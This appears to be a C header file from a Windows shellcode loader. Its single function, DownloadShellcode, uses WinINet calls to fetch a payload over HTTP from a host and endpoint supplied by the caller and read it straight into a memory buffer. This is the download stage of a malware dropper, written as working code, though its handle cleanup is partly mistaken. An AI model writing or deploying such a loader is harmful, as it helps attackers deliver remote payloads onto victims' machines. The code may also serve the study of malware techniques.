#pragma once
#ifdef DEBUG
#include <stdio.h>
#endif

#include <windows.h>
#include <wininet.h>

VOID DownloadShellcode(CHAR* Host, DWORD Port, CHAR* Endpoint, PVOID MemorySpace, DWORD dwMemorySize)
{
    // FIXME: Not using ssl
    // InternetOpenA
    HINTERNET hInternet = InternetOpenA(
        "user_agent",
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0
    );

    if (hInternet == INVALID_HANDLE_VALUE)
    {
        #ifdef DEBUG
            printf("[Info] hInternet = INVALID_HANDLE_VALUE (E: %#02x)\n", GetLastError());
        #endif
        return;
    }

    // InternetConnectA
    HINTERNET hConnection = InternetConnectA(
        hInternet,
        Host,
        Port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        0
    );

    if (hConnection == INVALID_HANDLE_VALUE)
    {
        #ifdef DEBUG
            printf("[Info] hConnection = INVALID_HANDLE_VALUE (E: %#02x)\n", GetLastError());
        #endif

        CloseHandle(hInternet);
        return;
    }

    // HttpOpenRequestA
    HINTERNET hRequest = HttpOpenRequestA(
        hConnection,
        "GET",
        Endpoint,
        NULL,
        NULL,
        NULL,
        INTERNET_FLAG_SECURE,
        0
    );

    if (hRequest == INVALID_HANDLE_VALUE)
    {
        #ifdef DEBUG
            printf("[Info] hRequest = INVALID_HANDLE_VALUE (E: %#02x)\n", GetLastError());
        #endif

        CloseHandle(hInternet);
        CloseHandle(hConnection);
        return;
    }

    // HttpSendRequestA
    if (!HttpSendRequestA(
        hRequest,
        NULL,
        0,
        0,
        0
    ))
    {
        #ifdef DEBUG
            printf("[Info] hRequest = INVALID_HANDLE_VALUE (E: %#02x)\n", GetLastError());
        #endif
        
        CloseHandle(hRequest);
        CloseHandle(hInternet);
        CloseHandle(hConnection);

        return;
    }
    
    // InternetReadFile
    DWORD dwRead = 0;

    if (!InternetReadFile(hRequest, MemorySpace, dwMemorySize, &dwRead))
    {
        #ifdef DEBUG
            printf("[Info] InternetReadFile(...) = FALSE (E: %#02x)\n", GetLastError());
        #endif

        CloseHandle(hRequest);
        CloseHandle(hInternet);
        CloseHandle(hConnection);
        
        return;
    }

    // Cleanup
    CloseHandle(hRequest);
    CloseHandle(hInternet);
    CloseHandle(hConnection);
}